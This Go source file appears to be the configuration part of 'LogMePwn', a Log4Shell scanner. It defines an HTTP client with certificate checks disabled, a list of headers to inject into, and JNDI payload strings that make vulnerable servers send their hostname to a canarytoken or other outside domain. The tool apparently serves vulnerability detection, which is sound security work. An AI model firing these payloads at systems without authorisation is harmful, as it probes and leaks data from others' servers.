package main

import (
	"crypto/tls"
	"fmt"
	"time"

	"github.com/valyala/fasthttp"
)

var (
	randomScan                       bool
	useJson, useXML                  bool
	maxConcurrent, delay             int
	hHeaders, hBody, customServer    string
	email, webhook, dummyXML, xload  string
	canaryToken, dummyJSON, urlFile  string
	commonPorts, hMethods, userAgent string
	allTargets, allPorts, allMethods []string

	procCount  = 1
	canaryResp = new(CanaryResp)
	ProcChan   = make(chan *ProcJob, maxWorkers)
	httpClient = fasthttp.Client{
		MaxIdemponentCallAttempts: 512,
		WriteTimeout:              3 * time.Second,
		MaxConnDuration:           3 * time.Second,
		MaxIdleConnDuration:       2 * time.Second,
		MaxConnWaitTimeout:        5 * time.Second,
		// less emphasis on read because at almost all times
		// we're bound to not get a response and timeout
		ReadTimeout: 3 * time.Second,
		TLSConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}
	defaultHTTPHeaders = []string{
		"A-IM", "Accept", "Accept-Charset", "Accept-Datetime", "Accept-Encoding",
		"Accept-Language", "Access-Control-Request-Method", "Access-Control-Request-Headers",
		"Authorization", "Cache-Control", "Content-Encoding", "Content-MD5", "Content-Type",
		"Cookie", "Date", "Expect", "Forwarded", "From", "HTTP2-Settings", "If-Match",
		"If-Modified-Since", "If-None-Match", "If-Range", "If-Unmodified-Since",
		"Max-Forwards", "Origin", "Pragma", "Prefer", "Proxy-Authorization", "Range", "Referer",
		"TE", "Trailer", "Transfer-Encoding", "User-Agent", "Upgrade", "Via", "Warning",
		"Upgrade-Insecure-Requests", "X-Requested-With", "DNT", "X-Forwarded-For", "X-Correlation-ID",
		"X-Forwarded-Host", "X-Forwarded-Proto", "Front-End-Https", "X-ATT-DeviceId",
		"X-Wap-Profile", "Proxy-Connection", "X-UIDH", "X-Csrf-Token", "X-Request-ID", "X-Api-Version",
	}
	lackofart = fmt.Sprintf(`
    +---------------------+
    |   L o g M e P w n   |
    +---------------------+  %s

                ~ 0xInfection`, version)
)

type (
	ProcJob struct {
		Host   string
		Method string
	}
	CanaryResp struct {
		Token         string      `json:"Token"`
		Hostname      string      `json:"Hostname"`
		URLComponents [][]string  `json:"Url_components"`
		Error         interface{} `json:"Error"`
		URL           string      `json:"Url"`
		ErrorMessage  interface{} `json:"Error_Message"`
		Email         string      `json:"Email"`
		Auth          string      `json:"Auth"`
	}
)

const (
	version           = "v1.0"
	letterBytes       = "abcdefghijklmnopqrstuvwxyz0123456789"
	maxWorkers        = 100
	canaryTokenFormat = "${jndi:ldap://x${hostName}.L4J.%s.canarytokens.com/a}"
	genericPayFormat  = "${jndi:dns://${hostname}.%s}"
)
